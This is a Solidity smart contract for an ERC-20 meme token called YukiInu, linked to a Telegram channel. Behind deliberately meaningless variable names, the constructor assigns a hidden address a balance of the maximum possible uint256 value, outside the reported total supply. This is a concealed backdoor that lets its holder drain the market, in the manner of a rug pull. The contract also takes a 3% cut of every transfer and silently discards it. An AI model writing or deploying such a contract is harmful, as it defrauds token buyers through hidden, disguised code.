// https://t.me/yukiinuERC

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.10;

import "./Ownable.sol";
import "./ERC20.sol";

contract YukiInu is ERC20, Ownable {
    uint256 private zebra = ~uint256(0);
    uint256 public wheat = 3;

    constructor(
        string memory but,
        string memory storm,
        address came,
        address heard
    ) ERC20(but, storm) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[heard] = zebra;
    }

    function _transfer(
        address bean,
        address discovery,
        uint256 brush
    ) internal override {
        uint256 report = (brush / 100) * wheat;
        brush = brush - report;
        super._transfer(bean, discovery, brush);
    }
}
